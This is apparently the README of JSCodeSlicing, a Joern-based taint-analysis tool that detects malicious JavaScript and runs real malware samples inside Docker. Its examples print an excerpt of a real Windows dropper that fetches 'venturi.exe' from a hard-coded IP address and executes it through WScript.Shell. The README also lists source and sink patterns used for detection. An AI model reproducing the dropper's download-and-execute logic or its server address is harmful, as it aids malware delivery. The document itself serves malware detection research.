# JSCodeSlicing

> **A powerful static analysis tool for detecting malicious JavaScript code using taint analysis and code slicing techniques.**

[![Scala](https://img.shields.io/badge/Scala-3.6.4-red.svg)](https://www.scala-lang.org/)
[![Joern](https://img.shields.io/badge/Joern-4.0.436-blue.svg)](https://joern.io/)
[![Docker](https://img.shields.io/badge/Docker-Supported-blue.svg)](https://www.docker.com/)

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Quick Start](#quick-start)
  - [Option 1: Docker (Recommended)](#option-1-docker-recommended)
  - [Option 2: Local Installation](#option-2-local-installation)
- [Usage](#usage)
- [Project Structure](#project-structure)
- [How It Works](#how-it-works)
- [Configuration](#configuration)
- [Examples](#examples)
- [Troubleshooting](#troubleshooting)
- [Contributing](#contributing)

---

## 🎯 Overview

JSCodeSlicing is a **static analysis tool** designed to detect malicious patterns in JavaScript code by performing taint analysis and code slicing. It uses **Code Property Graphs (CPG)** powered by [Joern](https://joern.io/) to identify data flows from untrusted sources (e.g., `process.argv`, network requests) to dangerous sinks (e.g., `eval()`, file writes, command execution).

### Why JSCodeSlicing?

- 🔍 **Malware Detection** - Identifies obfuscated malicious code patterns
- 🛡️ **Security Analysis** - Tracks tainted data flows from sources to sinks
- 🐳 **Docker Isolated** - Safely analyze real malware in containers
- 📊 **Code Slicing** - Extracts only relevant code paths for analysis
- ⚡ **Automated** - Batch processing of multiple JavaScript files

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| **Taint Analysis** | Tracks data flow from untrusted sources to dangerous sinks |
| **Malware Detection** | Identifies C&C servers, obfuscation, remote code execution |
| **Code Slicing** | Extracts minimal code needed to understand security flows |
| **Docker Support** | Run analysis in isolated containers for safety |
| **Batch Processing** | Analyze multiple packages with checkpoint tracking |
| **Real Malware Testing** | Includes script to download real malware samples safely |

### Detected Threats

- 🚨 Remote Code Execution (`eval`, `Function`, `setTimeout`)
- 🌐 Network Communication to C&C servers
- 💾 File System Manipulation
- 🔐 Code Obfuscation (Base64, `String.fromCharCode`)
- 🪟 Windows Scripting Host (`WScript.Shell`)
- ⚙️ Process Execution (`child_process.exec`, `spawn`)

---

## 🚀 Quick Start

Choose the method that works best for you:

### Option 1: Docker (Recommended)

**Best for:** Testing with real malware samples in a safe, isolated environment.

#### Prerequisites
- Docker Desktop installed and running
- PowerShell (Windows) or Bash (Linux/Mac)

#### Steps

```powershell
# Windows
.\docker-test.ps1

# Linux/Mac
./docker-test.sh
```

**What happens:**
1. ✅ Builds Docker image with Java 21, SBT, and astgen
2. ✅ Downloads 10 real malware samples inside container
3. ✅ Runs analysis (`sbt run`)
4. ✅ Exports results to `./output/` directory
5. ✅ Cleans up (malware never touches your host machine)

**Output:** `./output/malware_samples/code_slice.txt` (6KB+)

---

### Option 2: Local Installation

**Best for:** Development, debugging, or analyzing your own JavaScript files.

#### Prerequisites

- **Java:** JDK 17 or later
- **SBT:** Scala Build Tool ([install guide](https://www.scala-sbt.org/download.html))
- **astgen:** Binary for your OS ([download here](https://github.com/joernio/astgen/releases))

#### Automated Setup (Windows)

```powershell
.\setup.ps1
```

This script will:
- Check for Java and SBT
- Download the correct `astgen` binary for Windows
- Set environment variables

#### Manual Setup

**1. Download astgen**

Visit [astgen releases](https://github.com/joernio/astgen/releases/tag/v3.35.0) and download:
- Windows: `astgen-win.exe`
- Linux: `astgen-linux`
- macOS: `astgen-macos`

**2. Install astgen**

```bash
# Create directory
mkdir -p ./astgen

# Move downloaded binary
mv ~/Downloads/astgen-* ./astgen/

# Linux/Mac: Make executable
chmod +x ./astgen/astgen-*

# Set environment variable
# Windows (PowerShell)
$env:ASTGEN_BIN = "$PWD\astgen\astgen-win.exe"

# Linux/Mac (Bash)
export ASTGEN_BIN="$(pwd)/astgen/astgen-linux"
```

**3. Verify Installation**

```bash
sbt compile
```

If successful, you're ready to run!

---

## 📖 Usage

### Basic Usage

**1. Prepare Input Files**

Place your JavaScript files in a package directory:

```
src/main/resources/input/
└── my_package/
    ├── app.js
    ├── malicious.js
    └── utils.js
```

**2. Run Analysis**

```bash
sbt run
```

**3. View Results**

```
src/main/resources/output/
└── my_package/
    ├── code_slice.txt    # Extracted malicious code flows
    └── cpg.bin           # Code Property Graph (binary)
```

### Example: Analyzing Test Sample

Create a simple test file:

```bash
mkdir -p src/main/resources/input/test_sample
```

**File:** `src/main/resources/input/test_sample/test.js`
```javascript
var userInput = process.argv[2];  // Source: User input
eval(userInput);                   // Sink: Code execution
```

**Run:**
```bash
sbt run
```

**Result:** Code slice showing the flow from `process.argv` → `eval`

---

### Docker Usage (Real Malware)

**Run with Real Malware Samples:**

```powershell
# Windows
.\docker-test.ps1

# Linux/Mac
docker build -t jscodeslicing-test .
docker run --rm jscodeslicing-test
```

**Add Custom Malware URLs:**

Edit `download-malware.sh`:
```bash
wget -q https://your-malware-source.com/sample.js -O custom_malware.js
```

**Export Results:**

```bash
# Create container
docker create --name malware-test jscodeslicing-test

# Start analysis
docker start -a malware-test

# Copy results to host
docker cp malware-test:/app/src/main/resources/output ./output

# Cleanup
docker rm malware-test
```

---

## 📁 Project Structure

```
JSCodeSlicing/
├── src/
│   ├── main/
│   │   ├── scala/
│   │   │   ├── Main.scala              # Entry point
│   │   │   ├── CodeSlice/
│   │   │   │   ├── CodeSlice.scala     # Trait definition
│   │   │   │   ├── CodeSliceImp.scala  # Core analysis logic
│   │   │   │   ├── Group/              # Source/Sink node groups
│   │   │   │   └── Path/               # Path extraction
│   │   │   ├── FileProcessor/          # File I/O operations
│   │   │   │   ├── IOFileProcessor.scala
│   │   │   │   └── IOFileProcessorImpl.scala
│   │   │   └── Type/
│   │   │       ├── Source/
│   │   │       │   └── SourceGroups.scala  # Define sources
│   │   │       ├── Sink/
│   │   │       │   └── SinkGroups.scala    # Define sinks
│   │   │       └── TypeDefinition.scala
│   │   └── resources/
│   │       ├── input/                   # Your JS files here
│   │       │   └── [package-name]/
│   │       ├── output/                  # Analysis results
│   │       │   └── [package-name]/
│   │       ├── checkpoint.txt           # Processed packages
│   │       └── is_processing.txt        # Currently processing
│   └── test/
│       └── scala/                       # Unit tests
├── astgen/
│   └── astgen-win.exe                   # AST generator binary
├── project/
│   └── build.properties
├── build.sbt                            # SBT configuration
├── Dockerfile                           # Docker image definition
├── docker-test.ps1                      # Windows Docker runner
├── download-malware.sh                  # Malware downloader (Docker only)
├── setup.ps1                            # Windows setup script
└── README.md
```

---

## 🔍 How It Works

### Analysis Pipeline

```
┌─────────────────┐
│ JavaScript Code │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  astgen (CPG)   │  ← Creates Code Property Graph
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Source Detection│  ← Find untrusted data sources
│ - process.argv  │     • User input
│ - HTTP requests │     • Network data
│ - File reads    │     • Environment vars
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Sink Detection  │  ← Find dangerous operations
│ - eval()        │     • Code execution
│ - exec()        │     • Command execution
│ - writeFile()   │     • File writes
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Taint Analysis  │  ← Track data flow
│ (BFS Traversal) │     Source → ... → Sink
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Code Slicing   │  ← Extract relevant code
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ code_slice.txt  │  ← Final output
└─────────────────┘
```

### Source & Sink Definitions

**Sources** (Untrusted Data)
- `process.argv`, `process.env` - User/environment input
- `http.get()`, `fetch()` - Network requests
- `fs.readFile()` - File reads
- `String.fromCharCode()` - Obfuscation
- `atob()`, `decodeURI()` - Encoding

**Sinks** (Dangerous Operations)
- `eval()`, `Function()` - Code execution
- `child_process.exec()` - Command execution
- `fs.writeFile()` - File writes
- `http.request()` - Network sends
- `WScript.Shell.Run()` - Windows execution

📝 *Full lists in `src/main/scala/Type/Source/SourceGroups.scala` and `SinkGroups.scala`*

---

## ⚙️ Configuration

### Customize Sources/Sinks

**Add Custom Source:**

Edit `src/main/scala/Type/Source/SourceGroups.scala`:

```scala
private val CUSTOM_SOURCES: Seq[TypeDefinition] = Seq(
  CallType("myCustomSource"),
  CodeType("myVariable"),
  RegexType(".*pattern.*")
)
```

**Add Custom Sink:**

Edit `src/main/scala/Type/Sink/SinkGroups.scala`:

```scala
private val CUSTOM_SINKS: Seq[TypeDefinition] = Seq(
  CallType("dangerousFunction"),
  RegexType(".*malicious.*")
)
```

### Adjust Timeout

Edit `Main.scala` line 43:

```scala
val TIMEOUT_SECONDS = 180  // Change to 300 for slower analysis
```

---

## 📊 Examples

### Example 1: Simple Taint Flow

**Input:** `src/main/resources/input/example1/test.js`
```javascript
var input = process.argv[2];
eval(input);
```

**Output:** `src/main/resources/output/example1/code_slice.txt`
```
// File: test.js
// ======================================================================
Line 1: var input = process.argv[2]
Line 2: eval(input)
```

---

### Example 2: Real Malware Detection

**Input:** Downloaded malware from Docker

**Output:** `output/malware_samples/code_slice.txt`
```javascript
// File: real_malware_10.js
Line 8: var GnjajlnEi = NbjdnsclFfiBPsM("WScript.Shell");
Line 11: var zzauIjtSBHO = NbjdnsclFfiBPsM("MSXML2.XMLHTTP"); 
Line 32: zzauIjtSBHO.open("GET", MNxmxraR, false);
Line 33: zzauIjtSBHO.send();
Line 43: igMcqGRHjo("http://46.30.42.123/venturi.exe", "199997684.exe", 1)
```

**Analysis:**
- 🚨 C&C Server: `46.30.42.123`
- 🚨 Downloads: `venturi.exe`
- 🚨 Execution: WScript.Shell

---

## 🐛 Troubleshooting

### Common Issues

| Problem | Solution |
|---------|----------|
| **"ASTGEN_BIN not set"** | Set environment variable: `$env:ASTGEN_BIN = "$PWD\astgen\astgen-win.exe"` |
| **"Cannot find astgen binary"** | Download from [releases](https://github.com/joernio/astgen/releases) |
| **"Timeout processing package"** | Increase `TIMEOUT_SECONDS` in `Main.scala` |
| **Empty code_slice.txt** | No flows detected - check source/sink definitions |
| **Docker build fails** | Ensure Docker is running: `docker ps` |

### Debug Mode

Enable verbose logging:

```bash
# Edit build.sbt and add:
logLevel := Level.Debug
```

### Clean Build

```bash
sbt clean compile
```

---

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

1. **Add More Sources/Sinks** - Expand malware detection coverage
2. **Improve Flow Detection** - Enhance taint analysis algorithms
3. **Add Test Cases** - Create more malware samples for testing
4. **Documentation** - Improve guides and examples
5. **Performance** - Optimize CPG traversal

### Development Setup

```bash
# Clone repository
git clone https://github.com/yourusername/JSCodeSlicing.git

# Install dependencies
sbt update

# Run tests
sbt test

# Format code
sbt scalafmt
```

---

## 📚 Resources

- **Joern Documentation:** [https://docs.joern.io/](https://docs.joern.io/)
- **astgen Repository:** [https://github.com/joernio/astgen](https://github.com/joernio/astgen)
- **Code Property Graph:** [https://cpg.joern.io/](https://cpg.joern.io/)
- **Malware Samples:** [MALWARE_LINKS.md](MALWARE_LINKS.md)

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 💬 Support

- **Issues:** [GitHub Issues](https://github.com/yourusername/JSCodeSlicing/issues)
- **Discussions:** [GitHub Discussions](https://github.com/yourusername/JSCodeSlicing/discussions)
- **Email:** your.email@example.com

---

## ⚠️ Disclaimer

This tool is designed for **security research and educational purposes only**. The included malware samples are real and potentially harmful. Always use Docker for malware analysis and never execute malware on production systems.

**Use at your own risk.** The authors are not responsible for any damage caused by misuse of this tool.

---

**Made with ❤️ by Security Researchers**

*Last Updated: November 2025*
